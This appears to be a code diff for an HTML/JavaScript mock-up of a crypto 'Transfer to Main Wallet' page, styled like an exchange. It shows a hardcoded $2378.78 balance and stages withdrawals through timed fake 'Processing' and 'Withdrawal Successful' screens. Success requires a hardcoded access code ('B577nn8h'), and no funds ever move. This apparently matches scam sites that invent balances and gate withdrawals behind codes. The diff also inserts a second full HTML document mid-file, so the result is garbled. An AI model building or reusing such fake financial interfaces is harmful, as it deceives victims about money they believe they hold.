@@ -236,117 +236,8 @@
     <button onclick="showPage(5)">Return to Dashboard</button>
   </div>
 </div>
-  
-<!-- Page 8: Transfer to Main Wallet -->
-<div class="page" id="page8">
-  <div class="form-container">
-    <h2>Transfer to Main Wallet</h2>
-    <div class="input-section">
-      <label>Input Wallet:</label>
-      <input type="text" id="inputWallet" placeholder="Enter wallet address">
 
-      <label>Network:</label>
-      <div class="dropdown">
-        <select id="networkSelect">
-          <option disabled selected>Select Network</option>
-          <option>BNB Smart Chain BEP20</option>
-          <option>ETH Ethereum</option>
-          <option>Tron Trc20</option>
-          <option>Solana</option>
-        </select>
-      </div>
-
-      <label>Amount:</label>
-      <div class="amount-row">
-        <input type="number" id="transferAmount" placeholder="Enter amount">
-        <button onclick="setMaxAmount()">Max</button>
-      </div>
-
-      <button onclick="showAccessCodePopup()">CONFIRM</button>
-    </div>
-  </div>
-</div>
-
-<!-- Access Code Popup -->
-<div class="popup" id="accessCodePopup">
-  <label>Enter Access Code:</label>
-  <input type="text" id="accessCodeInput" placeholder="Access Code">
-  <button onclick="validateAccessCode()">Confirm</button>
-</div>
-
-<!-- Processing Page -->
-<div class="page" id="processingPage">
-  <div class="form-container">
-    <h2>Transaction Processing...</h2>
-  </div>
-</div>
-
-<!-- Success Page -->
-<div class="page" id="successPage">
-  <div class="form-container success-page">
-    <p class="bold-success">Withdrawal Successful</p>
-  </div>
-</div>
-
-<!-- Connecting Page (Wrong Code Delay) -->
-<div class="page" id="connectingPage">
-  <div class="form-container">
-    <h2>Connecting...</h2>
-  </div>
-</div>
-
-<!-- Decline Page -->
-<div class="page" id="declinePage">
-  <div class="form-container">
-    <p class="bold-decline">Transaction Declined</p>
-  </div>
-</div>
-
-<!-- JavaScript logic -->
-<script>
-  let totalAsset = 2378.78;
-
-  function showPage(id) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('visible'));
-    document.getElementById(id).classList.add('visible');
-  }
-
-  function setMaxAmount() {
-    document.getElementById('transferAmount').value = totalAsset;
-  }
-
-  function showAccessCodePopup() {
-    document.getElementById('accessCodePopup').style.display = 'block';
-  }
-
-  function validateAccessCode() {
-    const input = document.getElementById('accessCodeInput').value;
-    document.getElementById('accessCodePopup').style.display = 'none';
-
-    if (input === 'B577nn8h') {
-      showPage('processingPage');
-      setTimeout(() => {
-        showPage('successPage');
-        totalAsset = 0;
-        document.getElementById('totalAssetsDisplay').innerText = `$${totalAsset.toFixed(2)}`;
-        setTimeout(() => showPage('page5'), 3000);
-      }, 8000);
-    } else {
-      showPage('connectingPage');
-      setTimeout(() => {
-        showPage('declinePage');
-        setTimeout(() => {
-          showPage('page5');
-          document.getElementById('transferAmount').value = '';
-          document.getElementById('inputWallet').value = '';
-          document.getElementById('networkSelect').selectedIndex = 0;
-        }, 3000);
-      }, 7000);
-    }
-  }
-</script>
-
-<script>
+  <script>
   function confirmWallet() {
     const walletInput = document.getElementById('walletAddress');
     const wallet = walletInput.value.trim();
@@ -752,68 +643,167 @@
   </div>
 </div>
   
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Page 8 - Transfer to Main Wallet</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #0b0e11;
+      color: #eaecef;
+    }
+
+    .page {
+      display: none;
+      padding: 30px;
+    }
+
+    .visible {
+      display: block;
+    }
+
+    .form-container {
+      max-width: 450px;
+      margin: auto;
+      background-color: #1e2329;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 8px rgba(14, 203, 129, 0.2);
+    }
+
+    h2 {
+      color: #f0b90b;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #a1a7bb;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 6px;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+
+    input, select {
+      background-color: #2b3139;
+      color: white;
+    }
+
+    button {
+      margin-top: 20px;
+      background-color: #f0b90b;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .amount-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .amount-row input {
+      flex: 1;
+    }
+
+    .amount-row button {
+      width: 70px;
+      background-color: #2b3139;
+      color: #f0b90b;
+    }
+
+    .bold-success {
+      color: #0ecb81;
+      font-weight: bold;
+      font-size: 22px;
+      text-align: center;
+    }
+
+    .bold-decline {
+      color: #e74c3c;
+      font-weight: bold;
+      font-size: 22px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
 <!-- Page 8: Transfer to Main Wallet -->
-<div class="page" id="page8">
+<div class="page visible" id="page8">
   <div class="form-container">
     <h2>Transfer to Main Wallet</h2>
-    <div class="input-section">
-      <label>Input Wallet:</label>
-      <input type="text" id="inputWallet" placeholder="Enter wallet address">
+    <label>Input Wallet Address</label>
+    <input type="text" id="inputWallet" placeholder="Enter wallet address">
 
-      <label>Network:</label>
-      <div class="dropdown">
-        <select id="networkSelect">
-          <option disabled selected>Select Network</option>
-          <option>BNB Smart Chain BEP20</option>
-          <option>ETH Ethereum</option>
-          <option>Tron Trc20</option>
-          <option>Solana</option>
-        </select>
-      </div>
+    <label>Select Network</label>
+    <select id="networkSelect">
+      <option disabled selected>Select Network</option>
+      <option>BNB Smart Chain BEP20</option>
+      <option>ETH Ethereum</option>
+      <option>Tron Trc20</option>
+      <option>Solana</option>
+    </select>
 
-      <label>Amount:</label>
-      <div class="amount-row">
-        <input type="number" id="transferAmount" placeholder="Enter amount">
-        <button onclick="setMaxAmount()">Max</button>
-      </div>
-
-      <button onclick="showAccessCodePopup()">CONFIRM</button>
+    <label>Amount</label>
+    <div class="amount-row">
+      <input type="number" id="transferAmount" placeholder="Enter amount">
+      <button onclick="setMaxAmount()">Max</button>
     </div>
+
+    <button onclick="goToAccessCodePage()">CONFIRM</button>
   </div>
 </div>
 
-<!-- Access Code Popup -->
-<div class="popup" id="accessCodePopup">
-  <label>Enter Access Code:</label>
-  <input type="text" id="accessCodeInput" placeholder="Access Code">
-  <button onclick="validateAccessCode()">Confirm</button>
+<!-- Access Code Page -->
+<div class="page" id="accessCodePage">
+  <div class="form-container">
+    <h2>Enter Access Code</h2>
+    <label>Access Code</label>
+    <input type="text" id="accessCodeInput" placeholder="Access Code">
+    <button onclick="validateAccessCode()">Confirm</button>
+  </div>
 </div>
 
 <!-- Processing Page -->
 <div class="page" id="processingPage">
   <div class="form-container">
     <h2>Transaction Processing...</h2>
+    <p style="text-align:center;">Verifying access code...</p>
   </div>
 </div>
 
 <!-- Success Page -->
 <div class="page" id="successPage">
-  <div class="form-container success-page">
-    <p class="bold-success">Withdrawal Successful</p>
-  </div>
-</div>
-
-<!-- Connecting Page (Wrong Code Delay) -->
-<div class="page" id="connectingPage">
   <div class="form-container">
-    <h2>Connecting...</h2>
+    <p class="bold-success">Withdrawal Successful</p>
   </div>
 </div>
 
 <!-- Decline Page -->
 <div class="page" id="declinePage">
   <div class="form-container">
-    <p class="bold-decline">Transaction Declined</p>
+    <p class="bold-decline">Transaction Declined - Invalid Access Code</p>
+  </div>
+</div>
+
+<!-- Main Dashboard Page (Page 5) -->
+<div class="page" id="page5">
+  <div class="form-container">
+    <h2>Main Dashboard</h2>
+    <p>Total Assets: <span id="totalAssetsDisplay">$2378.78</span></p>
+    <button onclick="showPage('page8')">Make Another Transfer</button>
   </div>
 </div>
 
@@ -830,34 +820,44 @@
     document.getElementById('transferAmount').value = totalAsset;
   }
 
-  function showAccessCodePopup() {
-    document.getElementById('accessCodePopup').style.display = 'block';
+  function goToAccessCodePage() {
+    const wallet = document.getElementById('inputWallet').value.trim();
+    const network = document.getElementById('networkSelect').value;
+    const amount = document.getElementById('transferAmount').value;
+
+    if (!wallet || network === "Select Network" || !amount) {
+      alert("Please complete all fields before proceeding.");
+      return;
+    }
+
+    showPage('accessCodePage');
   }
 
   function validateAccessCode() {
-    const input = document.getElementById('accessCodeInput').value;
-    document.getElementById('accessCodePopup').style.display = 'none';
+    const inputCode = document.getElementById('accessCodeInput').value.trim();
+    showPage('processingPage');
 
-    if (input === 'B577nn8h') {
-      showPage('processingPage');
-      setTimeout(() => {
+    setTimeout(() => {
+      if (inputCode === 'B577nn8h') {
         showPage('successPage');
         totalAsset = 0;
         document.getElementById('totalAssetsDisplay').innerText = `$${totalAsset.toFixed(2)}`;
         setTimeout(() => showPage('page5'), 3000);
-      }, 8000);
-    } else {
-      showPage('connectingPage');
-      setTimeout(() => {
+      } else {
         showPage('declinePage');
         setTimeout(() => {
           showPage('page5');
-          document.getElementById('transferAmount').value = '';
-          document.getElementById('inputWallet').value = '';
-          document.getElementById('networkSelect').selectedIndex = 0;
+          resetForm();
         }, 3000);
-      }, 7000);
-    }
+      }
+    }, 4000);
+  }
+
+  function resetForm() {
+    document.getElementById('inputWallet').value = '';
+    document.getElementById('networkSelect').selectedIndex = 0;
+    document.getElementById('transferAmount').value = '';
+    document.getElementById('accessCodeInput').value = '';
   }
 </script>
   
